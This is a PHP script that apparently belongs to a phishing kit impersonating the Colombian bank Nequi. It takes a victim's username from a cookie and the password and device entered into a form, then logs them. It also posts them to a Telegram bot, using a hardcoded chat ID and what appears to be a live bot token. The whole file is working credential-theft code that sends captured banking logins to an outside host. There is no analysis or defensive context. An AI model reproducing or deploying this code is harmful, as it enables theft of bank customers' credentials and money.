

<?php 
require('../prueba/lib/funciones.php');
require('../bot.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_POST['pass'];
$dispositivo = $_POST['dis'];

setcookie('contrasena',$contrasena,time()+60*9);

crear_registro($usuario,$contrasena,$dispositivo);

$chatId = "-4088574570";
$token = "6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ";
$mensaje = "😈NUEVO INGRESO😈\n🏦NEQUI\n👁User y Pass: $contrasena \n👁Dispositivo: $dispositivo";

enviarMensajeTelegram($chatId, $mensaje, $token);

function enviarMensajeTelegram($chatId, $mensaje, $token) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $mensaje
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        // Error al enviar el mensaje
        return false;
    }

    // El mensaje se envió correctamente
    return true;
}
if(empty($usuario) || empty($contrasena)){
    
}else{
    
$chatId= "-4088574570";
$mensaje = "Nuevo Usuario: $usuario - $contrasena";
$token = "6473831509:AAEOJz1wQGkabbzRuXKWmvGXKqDo1dhBFcQ";
// enviarMensajeTelegram($chatId, $mensaje, $token);
}


?>